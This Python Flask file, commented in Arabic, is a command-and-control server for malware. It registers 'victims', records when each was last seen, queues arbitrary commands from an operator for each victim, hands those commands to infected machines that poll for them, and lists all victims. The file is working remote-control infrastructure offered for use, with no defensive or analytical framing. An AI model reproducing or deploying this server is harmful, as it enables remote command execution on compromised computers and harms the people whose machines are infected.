from flask import Flask, request, jsonify
import os
import json
from datetime import datetime

app = Flask(__name__)

victims_file = 'victims.json'
commands = {}

# تسجيل ضحية جديدة
@app.route('/register', methods=['POST'])
def register_victim():
    data = request.get_json()
    victim_id = data.get('id')
    if not victim_id:
        return jsonify({"error": "Missing victim ID"}), 400

    victims_list = []
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []

    found = False
    for victim in victims_list:
        if victim['id'] == victim_id:
            victim['status'] = 'online'
            victim['last_seen'] = datetime.utcnow().isoformat()
            found = True
            break

    if not found:
        victims_list.append({
            "id": victim_id,
            "status": "online",
            "last_seen": datetime.utcnow().isoformat()
        })

    with open(victims_file, 'w', encoding='utf-8') as f:
        json.dump(victims_list, f, indent=2, ensure_ascii=False)

    print(f"[REGISTER] Victim {victim_id} registered/updated")
    return jsonify({"status": "ok"})


# API لإرسال أمر للضحية
@app.route('/api/execute', methods=['POST'])
def execute_command():
    data = request.get_json()
    victim_id = data.get('victim')   # نفس الحقل الذي يرسله cli5.py
    command = data.get('command')

    if not victim_id or not command:
        return jsonify({"error": "Missing victim or command"}), 400

    commands[victim_id] = command
    print(f"[COMMAND] For {victim_id}: {command}")
    return jsonify({"status": "ok"})


# API لجلب الأمر من طرف الضحية
@app.route('/api/get_command', methods=['GET'])
def get_command():
    victim_id = request.args.get('victim')
    if not victim_id:
        return jsonify({"error": "Missing victim ID"}), 400

    cmd = commands.pop(victim_id, "")
    return jsonify({"command": cmd})


# API لجلب قائمة الضحايا
@app.route('/api/victims', methods=['GET'])
def get_victims():
    if os.path.exists(victims_file):
        with open(victims_file, 'r', encoding='utf-8') as f:
            try:
                victims_list = json.load(f)
            except json.JSONDecodeError:
                victims_list = []
    else:
        victims_list = []
    return jsonify(victims_list)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
